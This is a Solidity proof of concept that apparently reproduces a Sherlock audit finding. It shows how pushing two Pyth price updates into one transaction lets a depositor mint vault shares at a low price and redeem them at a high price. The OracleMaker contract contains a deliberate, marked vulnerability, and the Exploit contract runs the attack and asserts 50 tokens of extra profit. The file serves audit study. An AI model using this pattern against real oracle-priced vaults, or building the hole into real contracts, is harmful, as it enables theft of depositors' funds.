// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Perpetual — two Pyth prices in one transaction
    (Sherlock 2024-02 H-1, finding 32162).
    The maker holds 1 base. Depositing 100 collateral at price 100 mints 1 share
    against a 1-share pool. Updating to price 200 and withdrawing that share
    returns 150. One price, 200 for both, returns 100. Extra collateral is 50.
    Both updates use publishTime == block.timestamp, so maxAge does not stop it. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OracleMaker {
    uint256 public constant MAX_AGE = 1 hours;
    uint256 public price;
    uint256 public cash;
    uint256 public inventory = 1 ether;
    uint256 public totalSupply = 1 ether;
    mapping(address => uint256) public sharesOf;
    uint256 public minted;
    uint256 public paid;

    Asset public token;

    constructor(Asset token_) {
        token = token_;
        price = 100 ether;
    }

    function updatePrice(uint256 newPrice, uint256 publishTime) external {
        require(block.timestamp >= publishTime, "future");
        require(block.timestamp - publishTime <= MAX_AGE, "stale");
        price = newPrice;
    }

    function _getPrice() internal view returns (uint256) {
        return price;
    }

    function _getVaultValueSafe(uint256 px) internal view returns (uint256) {
        return cash + (inventory * px) / 1 ether;
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        require(token.transferFrom(msg.sender, address(this), amount), "pull");
        cash += amount;
        uint256 priceNow = _getPrice();
        uint256 vaultValueXShareDecimals = _getVaultValueSafe(priceNow) - amount;
        uint256 amountXShareDecimals = amount;
        // @> VULN: share mint uses the price stored in this transaction
        shares = (amountXShareDecimals * totalSupply) / vaultValueXShareDecimals;
        minted = shares;
        totalSupply += shares;
        sharesOf[msg.sender] += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 withdrawnAmount) {
        require(sharesOf[msg.sender] >= shares, "shares");
        uint256 priceNow = _getPrice();
        uint256 vaultValue = _getVaultValueSafe(priceNow);
        uint256 supplyBefore = totalSupply;
        withdrawnAmount = vaultValue * shares / supplyBefore;
        paid = withdrawnAmount;
        sharesOf[msg.sender] -= shares;
        totalSupply -= shares;
        if (withdrawnAmount > cash) cash = 0;
        else cash -= withdrawnAmount;
        require(token.transfer(msg.sender, withdrawnAmount), "pay");
    }
}

contract Exploit {
    uint256 public constant DEPOSIT_AMT = 100 ether;
    uint256 public constant LOW = 100 ether;
    uint256 public constant HIGH = 200 ether;

    Asset public token;
    OracleMaker public maker;
    uint256 public got;
    uint256 public extra;
    uint256 public controlGot;

    constructor() {
        token = new Asset();
        maker = new OracleMaker(token);
        token.mint(address(this), DEPOSIT_AMT);
    }

    function run() external {
        token.mint(address(maker), 200 ether);
        maker.updatePrice(LOW, block.timestamp);
        maker.deposit(DEPOSIT_AMT);
        maker.updatePrice(HIGH, block.timestamp);
        got = maker.withdraw(maker.sharesOf(address(this)));
        extra = got - DEPOSIT_AMT;
        require(maker.minted() == 1 ether, "shares");
        require(got == 150 ether, "out");
        require(extra == 50 ether, "extra");
    }

    function runControl() external {
        OracleMaker one = new OracleMaker(token);
        token.mint(address(this), DEPOSIT_AMT);
        one.updatePrice(HIGH, block.timestamp);
        one.deposit(DEPOSIT_AMT);
        controlGot = one.withdraw(one.sharesOf(address(this)));
        require(one.minted() == 0.5 ether, "fair shares");
        require(controlGot == DEPOSIT_AMT, "fair out");
        require(controlGot < 150 ether, "no extra");
    }
}
